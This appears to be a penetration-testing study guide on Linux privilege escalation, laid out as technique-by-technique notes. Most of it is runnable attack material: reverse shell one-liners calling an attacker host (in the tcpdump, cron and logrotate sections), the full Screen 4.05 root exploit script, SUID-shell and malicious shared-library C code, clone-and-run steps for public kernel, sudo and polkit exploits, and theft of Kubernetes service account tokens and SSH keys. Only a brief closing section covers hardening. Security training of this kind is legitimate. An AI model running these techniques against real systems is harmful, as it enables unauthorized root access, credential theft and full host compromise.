# Linux Privilege Escalation

## Introduction to Linux Privilege Escalation

Root on a Linux host → capture traffic, read sensitive files, and pivot further. If the host is domain-joined, root means the NTLM hash and a path into attacking Active Directory.

First shell on a host — the checklist:

- **OS version** — distribution + version → available tools, public exploits. Check whether the release is still maintained (e.g. Ubuntu Focal = supported → likely patched kernel; still check).
- **Kernel version** — public kernel exploits may exist. Kernel exploits can crash the box; understand the exploit before running it against production.
- **Running services**, especially as root — misconfigured/vulnerable root services are an easy win (Nagios, Exim, Samba, ProFTPd; e.g. CVE-2016-9566, LPE in Nagios Core < 4.2.4). `ps aux | grep root`
- **Installed packages** — out-of-date/vulnerable versions (e.g. Screen 4.05.00, privesc).
- **Logged-in users** — lateral movement hints: `ps au` (terminal-attached processes).
- **Home directories** — other users' dirs readable? SSH keys, scripts, configs with credentials: `ls /home`, `ls -la /home/<user>/`. Check `.bash_history` — passwords as arguments, git usage, cron setup. Found SSH keys → try them on the host (stable session) and on other systems; cross-reference the ARP cache (`arp -a`) against usable keys. `ls -l ~/.ssh`
- **Sudo rights** — `sudo -l`. `NOPASSWD` entries show without a password; a user with full sudo is one `sudo su` from root. Not every root-runnable command escalates, though.
- **Config files** — `.conf`/`.config` files → usernames, passwords, secrets.
- **Readable `/etc/shadow`** → all password hashes → offline crack.
- **Hashes in `/etc/passwd`** — file is world-readable; uncommon but seen on embedded devices/routers → offline crack.
- **Cron jobs** — maintenance/backup tasks; combined with relative paths or weak permissions → escalation.
- **Unmounted filesystems / extra drives** — `lsblk`; mountable drives may hold backups, passwords.
- **setuid/setgid binaries** — run as root/group; many have abusable features.
- **Writable directories** — where to drop tools; a writable dir receiving cron output reveals job frequency and possible script overwrite.
- **Writable files** — world-writable scripts/configs run by root → append a command.

```bash
# world-writable directories / files
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## Environment Enumeration

Helper scripts exist (LinPEAS/LinEnum), but know what to look for manually. Orientation first — `whoami`, `id` (groups), `hostname`, `ifconfig` or `ip a` (subnet, extra NICs → other subnets), `sudo -l`.

```bash
cat /etc/os-release           # distro + version
uname -a                      # kernel; alternative: cat /proc/version
echo $PATH                    # misconfigured PATH = privesc (see Path Abuse)
env                           # may leak passwords
cat /etc/shells               # login shells; note tmux/screen availability
lsblk                         # block devices, unmounted partitions
lpstat                        # printers — queued jobs may hold sensitive data
route                         # or netstat -rn — reachable networks
cat /etc/resolv.conf          # internal DNS → AD enumeration starting point
arp -a
```

Check `/etc/fstab` for mounts and grep it for `password`, `username`, `credential` — creds for mounted drives live there.

Defenses to look for (their presence changes what's worth trying): Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, ufw. Config enumeration of these usually needs privileges, but knowing they exist avoids wasted effort.

Users and groups:

```bash
cat /etc/passwd                     # username:password:UID:GID:info:home:shell
cat /etc/passwd | cut -f1 -d:       # usernames
grep "sh$" /etc/passwd              # users with login shells; old bash (e.g. 4.1) → shellshock
cat /etc/group
getent group sudo                   # members of any interesting group
ls /home
```

Hash algorithm by prefix: `$1$` salted MD5, `$5$` SHA-256, `$6$` SHA-512, `$2a$` BCrypt, `$7$` Scrypt, `$argon2i$` Argon2.

Enumerate each home directory for readable `.bash_history`, config files, and SSH keys — persistence, privesc, or pivoting material. Any password found → try it against all users; reuse is common.

Filesystems:

```bash
df -h                                        # mounted filesystems
cat /etc/fstab | grep -v "#" | column -t     # unmounted filesystems
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null    # hidden files
find / -type d -name ".*" -ls 2>/dev/null                  # hidden directories
ls -l /tmp /var/tmp /dev/shm
```

`/tmp` — auto-deleted after ~10 days and wiped on reboot. `/var/tmp` — retained up to 30 days and survives reboots, so programs keep data there. All three are readable by everyone: check for temp logs, script output, leftovers.

Run linPEAS in a real assessment on top of the manual work — it often surfaces nuanced issues manual enumeration misses.

## Linux Services & Internals Enumeration

Deeper pass informing the later attacks: installed/running services, sockets, users/admins/groups, logged-in users and last logins, password policies, domain membership, history/log/backup files, recently modified files (patterns → hijackable cron), IP info, `/etc/hosts`, network connections, installed tools (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc), bash history, cron jobs.

```bash
ip a
cat /etc/hosts
lastlog                      # who logs in, how often
w                            # current users; also who / finger
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
ls -la /etc/cron.daily/
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"   # process cmdlines — scripts/binary paths per user
```

Packages and binaries:

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
sudo -V                      # sudo version — check for legacy exploits
ls -l /bin /usr/bin/ /usr/sbin/
```

Compare installed packages against GTFOBins to find candidates to investigate:

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```

`strace` traces system calls and signal processing — follow a program's flow to spot requests carrying passwords/tokens:

```bash
strace ping -c1 <TARGET_IP>
```

Config files and scripts are usually world-readable; even without write perms they reveal keys, internal paths, and processes worth abusing:

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
ps aux | grep root           # which scripts/binarys root is running
```

## Credential Hunting

Note every credential found — config files (`.conf`, `.config`, `.xml`), shell scripts, bash history, backup (`.bak`) files, database files, text files. Useful for escalating to other users, root, or other systems.

`/var` typically holds the web root — MySQL connection strings, WordPress config:

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php
```

Spool/mail directories, if accessible, are also worth checking. Broad config sweep:

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

SSH keys: search for accessible private keys — a key for a more privileged user gets you back in with more rights; keys for other hosts get lateral movement. Always check `known_hosts` (hosts the user connected to) for targets:

```bash
ls ~/.ssh
```

## Path Abuse

PATH holds the directories searched for executables. A script dropped in a PATH directory runs from anywhere. If we can modify a user's PATH, we can shadow a common binary like `ls` with a malicious script:

```bash
echo $PATH
PATH=.:${PATH}
export PATH

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls

ls
PATH ABUSE!!
```

This is why sudoers entries without absolute paths are exploitable (see Sudo Rights Abuse).

## Wildcard Abuse

Wildcards (`*` any chars, `?` single char, `[]` char set, `~` home, `-` range inside brackets) are interpreted by the shell before other actions — so a wildcard in a cron job can turn *file names we create* into command-line options.

Classic example: `tar` supports `--checkpoint[=N]` and `--checkpoint-action=ACTION`, including `EXEC`. Given a cron job backing up a user directory every minute:

```text
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

The `*` expands to include files we create named as tar options:

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

When the cron job runs, tar receives `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` as arguments and executes `root.sh` as root. Next `sudo -l` shows `(root) NOPASSWD: ALL` → root.

## Escaping Restricted Shells

Restricted shells limit what commands a user can run and where: `rbash` (no cd, no env changes, no commands outside PATH), `rksh` (no functions/env modification), `rzsh` (no scripts, aliases, env changes). Common in enterprises to cage external partners, contractors, etc.

Escape avenues:

- **Command injection** — inject into arguments of an allowed command: `ls -l `pwd`` runs `pwd` even if `pwd` itself is restricted.
- **Command substitution** — backtick or `$(...)` syntax if the shell allows it.
- **Command chaining** — `;` or `|` between an allowed and a restricted command.
- **Environment variables** — modify a variable the shell uses to pick the execution directory.
- **Shell functions** — define a function that runs a non-restricted command, if function definitions are permitted.

## Special Permissions

setuid (the `s` in the owner bits) runs a binary as its owner — usually root. Enumerate:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

setgid does the same for the group:

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Attack angle: reverse engineer setuid programs for vulns, or abuse their built-in command-execution features.

**GTFOBins** — curated list of binaries usable to escape restricted shells, escalate privileges, spawn shells, transfer files. Worth memorizing as many as possible. Example with apt:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Sudo Rights Abuse

`sudo -l` first — always. `NOPASSWD` entries are visible without a password. Loose sudoers rules are the win: over-broad commands, missing absolute paths, unintended options.

Example — sudoers grants `(root) NOPASSWD: /usr/sbin/tcpdump`. tcpdump's `-z postrotate-command` runs a command on each savefile rotation (used with `-C`/`-G`). Payload file `/tmp/.test`:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f
```

```bash
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Root shell on the listener almost instantly. AppArmor on recent distributions predefines postrotate commands and blocks this.

What a bad sudoers entry looks like (from the module's hardening notes): relative path instead of absolute (`cat` not `/bin/cat`) → PATH abuse; sudo granted beyond least privilege.

## Privileged Groups

Check `id` for these group memberships.

### LXC / LXD

LXD group membership → create a privileged container and read the host filesystem. Unpack an Alpine image, init LXD (accept defaults), import, then:

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true    # no UID mapping → container root = host root
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

Host root filesystem at `/mnt/root` — read `/etc/shadow`, grab SSH keys, etc.

### Docker

docker group ≈ root without a password. Spawn a container with the host filesystem mounted:

```bash
docker run -v /root:/mnt -it ubuntu
```

Browse `/mnt`, retrieve or add root SSH keys; same works for `/etc` (read `/etc/shadow`, add a user).

### Disk

disk group → full access to devices in `/dev` (e.g. `/dev/sda1`). Use `debugfs` for root-level access to the entire filesystem — SSH keys, credentials, user creation.

### ADM

adm group → read all logs in `/var/log`. No direct root, but sensitive data, user actions, and cron job enumeration.

## Capabilities

Fine-grained privileges on binaries. Set with setcap:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

setcap values: `=` clears, `+ep` effective + permitted, `+ei` effective + inheritable (children inherit), `+p` permitted only.

Privesc-relevant capabilities:

- `cap_setuid` — set effective UID → become root
- `cap_setgid` — set effective GID → root group
- `cap_sys_admin` — broad admin actions: system files, settings, mount/umount
- `cap_dac_override` — bypass file read/write/execute permission checks

Others worth recognizing: `cap_sys_ptrace` (debug other processes), `cap_sys_module` (load kernel modules), `cap_net_bind_service` (privileged ports).

Enumerate:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Example — `cap_dac_override` on vim:

```bash
getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```

vim can now edit any file regardless of permissions — rewrite `/etc/passwd` to drop root's password hash:

```bash
/usr/bin/vim.basic /etc/passwd
# or non-interactive:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

`root::0:0:...` → `su` logs in as root with no password.

## Vulnerable Services

**Screen 4.05.00** — missing permissions check when opening a log file: truncate any file or create root-owned files anywhere → root. Check with `screen -v`, run with `./screen_exploit.sh`:

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Cron Job Abuse

Crontab entry = minutes, hours, days, months, weeks, command (e.g. `0 */12 * * * /home/admin/backup.sh` runs every 12 hours). User crontabs land in `/var/spool/cron`; app-specific files in `/etc/cron.d` — sometimes misconfigured so non-root users can edit them.

Root crontab isn't readable, but a world-writable script that runs as root is just as good — you may even infer the schedule from output artifacts (a `.tar.gz` appearing every 12 hours). Append a command; it executes on the next run.

Workflow from the module: the writable-file sweep (Introduction) flags `/dmz-backups/backup.sh`. Directory listing shows tarballs created every 3 minutes — the sysadmin likely meant `0 */3 * * *` but wrote `*/3 * * * *`. The script is world-writable and runs as root.

Confirm with pspy (watches running processes, cron jobs, and filesystem events via procfs — no root needed):

```bash
./pspy64 -pf -i 1000
```

Output confirms `/bin/bash /dmz-backups/backup.sh` as UID=0, tarballing `/var/www/html`. Original script:

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Append a reverse shell to the end (keep the original functionality intact, always back the script up first):

```bash
bash -i >& /dev/tcp/<ATTACKER_IP> 443 0>&1
```

`nc -lnvp 443` → root shell within one cycle. Append to the end so the script still runs properly before the callback.

## Containers

LXC = OS-level virtualization; LXD is the daemon managing full system containers. Membership in the `lxd` (or `lxc`) group is the prerequisite — check with `id`.

Attack path: import an existing template (admins often keep passwordless templates around) and mount the host root:

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

`security.privileged=true` disables UID mapping — container root is host root. Host filesystem is now readable at `/mnt/root`.

## Docker

### Docker Shared Directories

Volume mounts bridge the host filesystem into the container. Enumerating a container, look for non-standard directories like `/hostsystem`:

```bash
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
```

Copy the key out and SSH into the host as that user:

```bash
ssh cry0l1t3@<TARGET_IP> -i cry0l1t3.priv
```

### Docker Sockets

A `docker.sock` inside the container lets the container's docker client talk to the host daemon. If the docker binary isn't installed in the container, serve a static binary from the attack host (`wget https://<parrot-os>:443/docker -O docker`, `chmod +x docker`) and use it against the socket:

```bash
/tmp/docker -H unix:///app/docker.sock ps
```

Then create a privileged container mapping the host root into it:

```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
cat /hostsystem/root/.ssh/id_rsa
```

### Docker Group

Membership in `docker` (or SUID on the docker binary, or sudoers rights to docker) → daemon control. Check available images:

```bash
docker image ls
```

### Docker Socket (writable)

If `/var/run/docker.sock` is writable outside the docker group, mount the host root and chroot into it:

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Kubernetes

Control plane TCP ports to remember: etcd 2379/2380, API server 6443, Scheduler 10251, Controller Manager 10252, Kubelet API 10250, read-only Kubelet API 10255.

The Kubelet allows anonymous access by default — requests without a valid client certificate are treated as unauthenticated but still answered.

API server first — anonymous root-path access gets denied:

```bash
curl https://<TARGET_IP>:6443 -k
# 403: User "system:anonymous" cannot get path "/"
```

Kubelet API (10250) leaks pod data — names, namespaces, images, last-applied configurations (which can contain passwords, secrets, API tokens):

```bash
curl https://<TARGET_IP>:10250/pods -k | jq .
```

kubeletctl wraps the same interaction:

```bash
kubeletctl -i --server <TARGET_IP> pods          # list pods
kubeletctl -i --server <TARGET_IP> scan rce      # which pods allow command execution
kubeletctl -i --server <TARGET_IP> exec "id" -p nginx -c nginx
```

If exec returns `uid=0` — root inside the container. Escalate further by pulling the service account token and cert from a pod:

```bash
kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Check what the token can do in the cluster:

```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list
```

If it can create pods (`pods [get create list]`), deploy one that mounts the host root filesystem:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 get pods
kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

## Logrotate

Manages/archives logs in `/var/log`, runs periodically via cron, configured through `/etc/logrotate.conf` + per-package files in `/etc/logrotate.d/`. Force a rotation with `-f`/`--force`, or set the date in the state file `/var/lib/logrotate.status`.

Exploitation requirements:

1. write permission on the log files
2. logrotate running as a privileged user/root
3. vulnerable version: 3.8.6, 3.11.0, 3.15.0, or 3.18.0

Confirm which mode logrotate uses — the exploit differs for `create` vs `compress`:

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

Then logrotten (compile on the target or on a similar kernel and transfer):

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload

./logrotten -p ./payload /tmp/tmp.log
```

Root reverse shell on the listener (`nc -nlvp 9001`).

## Miscellaneous Techniques

### Passive Traffic Capture

If tcpdump is installed, unprivileged users may capture traffic. net-creds and PCredz parse the wire for credentials — credit card numbers, SNMP community strings, and Net-NTLMv2/SMBv2/Kerberos hashes for offline cracking. Cleartext protocols (HTTP, FTP, POP, IMAP, telnet, SMTP) may carry reusable credentials.

### Weak NFS Privileges

```bash
showmount -e <TARGET_IP>
```

`/etc/exports` options that matter:

- `root_squash` — root client becomes `nfsnobody`; uploaded files owned by nfsnobody, blocks SUID uploads
- `no_root_squash` — remote root creates files on the server as root → SUID binaries possible

With `no_root_squash` on a share (e.g. `/tmp *(rw,no_root_squash)`), build a SETUID shell on our own root machine and drop it on the share:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
gcc shell.c -o shell
sudo mount -t nfs <TARGET_IP>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

Back in the low-privileged session on the target: `./shell` → root.

### Hijacking Tmux Sessions

A tmux session running as root with weak socket permissions is hijackable. Find them:

```bash
ps aux | grep tmux        # e.g. root running: tmux -S /shareds new -s debugsess
ls -la /shareds           # srw-rw---- root devs
id                        # our user in devs?
```

Attach with the socket path:

```bash
tmux -S /shareds
```

Root shell if the session owner is root.

## Kernel Exploits

Public kernel exploits for many versions (Dirty COW / CVE-2016-5195 being the famous one). Legacy systems miss patches due to compatibility constraints, so vulnerable kernels are common. Caution on production — kernel exploits can destabilize or crash the host.

Workflow:

```bash
uname -a
cat /etc/lsb-release
```

Google the exact kernel version for a PoC (e.g. `linux 4.4.0-116-generic exploit`), transfer, compile, run:

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

Some work out of the box, some need modification.

## Shared Libraries

Dynamically linked libraries (`.so`) can be modified to control the calling program. Load locations: `-rpath`/`-rpath-link` at compile time, `LD_RUN_PATH`/`LD_LIBRARY_PATH` env vars, `/lib` and `/usr/lib` defaults, extra directories in `/etc/ld.so.conf`. `LD_PRELOAD` loads a library before execution, overriding default functions. List a binary's dependencies with `ldd`:

```bash
ldd /bin/ls
```

### LD_PRELOAD Privilege Escalation

Requires sudo rights plus `env_keep+=LD_PRELOAD` in the sudoers Defaults. Even a non-GTFOBin command with an absolute path becomes exploitable — e.g. `(root) NOPASSWD: /usr/sbin/apache2 restart`. Library `root.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Full path to the library required. Root shell on execution.

## Shared Object Hijacking

Custom binaries under development often load custom libraries. Find one with the setuid bit and inspect it:

```bash
ls -la payroll          # -rwsr-xr-x root root
ldd payroll             # libshared.so => /development/libshared.so
readelf -d payroll | grep PATH
# RUNPATH: [/development]
```

The `RUNPATH` directory is checked first, before other configured locations. If it's world-writable (`drwxrwxrwx /development`), a malicious library there wins.

Identify the function the binary calls — copy libc into place and run it, the error names the missing symbol:

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
# ./payroll: symbol lookup error: undefined symbol: dbquery
```

Compile a replacement providing `dbquery`:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```

Root shell via the setuid binary.

## Python Library Hijacking

Three attack vectors, all requiring (or building on) the script running with elevated privileges. Note: the SUID bit on an interpreted script does nothing — Linux ignores it; it would have to be on `/usr/bin/python3` itself. Sudo rights to run the script are what matters.

### Insecure Write Permissions

`sudo -l` shows e.g. `(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py`. The script imports a module and calls one of its functions:

```python
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
```

Locate the module's function and check its permissions:

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- root staff → group/world-writable
```

Inject at the top of the function:

```python
def virtual_memory():
    #### Hijacking
    import os
    os.system('id')
    ...
```

```bash
sudo /usr/bin/python3 ./mem_status.py
```

`uid=0` — the injected code runs as root. Replace `id` with any payload (reverse shell).

### Python Library Search Path

Module resolution follows a priority order:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

If the imported module lives in a lower-priority path and we can write to a higher-priority one (e.g. `/usr/lib/python3.8` world-writable, sitting above the dist-packages install path of psutil), drop a module with the same name and the same function (and argument count — critical) into the higher-priority directory:

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Save as `psutil.py`, then `sudo /usr/bin/python3 mem_status.py` → root execution.

### PYTHONPATH Environment Variable

If `sudo -l` shows `SETENV:` on the python binary (env vars can be set under sudo), point the search path anywhere:

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

With `psutil.py` in `/tmp/`, the hijacked module loads and runs as root.

## Sudo

`sudo` executes processes as another user; `/etc/sudoers` defines who runs what. Inspect it:

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

### CVE-2021-3156 — Heap-Based Buffer Overflow

Affects sudo 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), and others. Check with `sudo -V | head -n1`. Public PoC:

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich        # lists target IDs by OS/sudo version
./sudo-hax-me-a-sandwich 1      # pick the matching ID
```

Root shell.

### Sudo Policy Bypass — CVE-2019-14287

All sudo versions below 1.8.28. Prerequisite: a sudoers entry allowing the user a command, e.g. `ALL=(ALL) /usr/bin/id`. Sudo accepts a user ID with `-u#`; specifying `-1` is processed as UID 0:

```bash
sudo -u#-1 id
```

Immediate root shell.

## Polkit

Authorization service for Linux. Relevant pieces:

- actions/policies in `/usr/share/polkit-1/actions`
- rules in `/usr/share/polkit-1/rules.d`
- local authority rules: `.pkla` files in `/etc/polkit-1/localauthority/50-local.d`
- `pkexec` (run a program as another user/root — sudo-like), `pkaction` (display actions), `pkcheck` (check a process's authorization)

```bash
pkexec -u root id
```

### Pwnkit — CVE-2021-4034

Memory corruption in pkexec, hidden for over ten years, published November 2021:

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

Root shell (switch from `sh` to `bash` after it lands).

## Dirty Pipe

CVE-2022-0847 — kernel vulnerability allowing writes to root-owned files the user can read. Affects kernels 5.8 through 5.17 (Android included). Similar in spirit to Dirty COW. Typical target: edit `/etc/passwd` to remove root's password → passwordless `su`.

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
uname -r    # verify kernel in range
```

Two exploit modes. `exploit-1` modifies `/etc/passwd` and drops a root shell (it backs the file up to `/tmp/passwd.bak` and sets root's password to "piped" during the run):

```bash
./exploit-1
```

`exploit-2` hijacks SUID binaries — find one and pass its full path:

```bash
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

## Netfilter

Kernel module for packet filtering/NAT; the layer behind iptables/arptables. Multiple recent privesc CVEs — relevant because companies often run old kernels in production, and containers still share the host kernel.

**CVE-2021-22555** — kernels 2.6–5.11:

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

**CVE-2022-25636** — kernels 5.4 through 5.6.10, heap out-of-bounds write in `nf_dup_netdev.c`. Can corrupt the kernel — a reboot may be required to recover the box:

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

**CVE-2023-32233** — kernels up to 6.3.1, use-after-free in nf_tables anonymous sets:

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

All of these can be unstable and break the system.

## Linux Hardening

Lynis audits a system's configuration and reports warnings/suggestions — runs unprivileged (some tests skipped) and works for pentesters as a quick baseline of the box's security state:

```bash
./lynis audit system
```

The hardening checklist mirrors the attack surface: audit writable files/dirs and SUID binaries, absolute paths in cron and sudoers, no cleartext creds in world-readable files, clean home dirs and histories, low-priv users unable to modify custom libraries, minimal packages/sudo rights. Update and patch — `unattended-upgrades` (Ubuntu/Debian) and `yum-cron` (Red Hat) automate it.